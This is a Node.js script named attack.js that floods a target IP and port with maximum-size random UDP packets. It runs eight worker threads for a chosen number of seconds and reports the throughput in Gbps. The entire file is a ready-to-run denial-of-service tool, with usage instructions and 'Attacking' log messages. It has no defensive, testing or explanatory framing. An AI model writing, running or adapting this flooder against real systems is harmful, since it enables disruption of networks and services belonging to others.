const dgram = require('dgram');
const { Worker, isMainThread } = require('worker_threads');
const process = require('process');

// Get command-line arguments
const targetIp = process.argv[2];  // Target IP
const duration = parseInt(process.argv[3], 10);  // Duration in seconds
const port = parseInt(process.argv[4], 10) || 53;  // Port (default to 53 if not provided)
const packetSize = 65507;  // Max UDP packet size (65507 bytes)

// Debug the arguments passed to the script
console.log('Arguments:', process.argv);

if (!targetIp || isNaN(duration) || duration <= 0) {
    console.error('Usage: node attack.js <IP> <duration> <port (optional)>');
    process.exit(1);
}

let totalBytesSent = 0;  // Track total bytes sent
let lastTime = Date.now();

// Generate large random UDP packets
function generateRandomData(size) {
    let buffer = Buffer.alloc(size);
    for (let i = 0; i < size; i++) {
        buffer[i] = Math.floor(Math.random() * 256);  // Random byte
    }
    return buffer;
}

// Main flooder logic - sends high-speed UDP packets
function udpFlood() {
    const socket = dgram.createSocket('udp4');  // UDP socket

    setInterval(() => {
        const data = generateRandomData(packetSize);  // Generate large random data
        socket.send(data, 0, data.length, port, targetIp, (err) => {
            if (err) {
                console.error('Error sending packet:', err);
            } else {
                totalBytesSent += data.length;  // Track total bytes sent
            }
        });
    }, 0);  // Send packets continuously
}

// Log the data rate (G/s) every second
function logDataRate() {
    setInterval(() => {
        const currentTime = Date.now();
        const elapsedTime = (currentTime - lastTime) / 1000;  // Time elapsed in seconds
        const bytesPerSecond = totalBytesSent / elapsedTime;  // Bytes per second
        const gigabitsPerSecond = (bytesPerSecond * 8) / (1024 * 1024 * 1024);  // Convert to Gbps

        console.log(`G/s: ${gigabitsPerSecond.toFixed(2)} Gbps`);
        totalBytesSent = 0;  // Reset the counter every second
        lastTime = currentTime;  // Reset the time
    }, 1000);  // Log every second
}

// Worker thread logic
if (isMainThread) {
    const numThreads = 8;  // Use 8 threads (1 per core) for high concurrency
    const workers = [];

    // Start the flood and stop after the specified duration
    const endTime = Date.now() + duration * 1000;

    // Start logging data rate
    logDataRate();

    for (let i = 0; i < numThreads; i++) {
        const worker = new Worker(__filename);  // Launch worker threads
        workers.push(worker);

        // Add error handling for worker thread
        worker.on('error', (err) => console.error(`Worker Error: ${err}`));
        worker.on('exit', (exitCode) => {
            if (exitCode !== 0) {
                console.error(`Worker stopped with exit code ${exitCode}`);
            }
        });
    }

    // Stop the attack after the given duration
    setTimeout(() => {
        console.log('Attack finished. Shutting down...');
        workers.forEach(worker => worker.terminate());
        process.exit();
    }, duration * 1000);

} else {
    try {
        console.log(`Worker started: Attacking ${targetIp} on port ${port} for ${duration} seconds...`);
        // Each worker thread starts flooding the target with large UDP packets
        udpFlood();
    } catch (error) {
        console.error('Worker Error: ', error);
        process.exit(1);  // Exit with error code if worker fails
    }
}
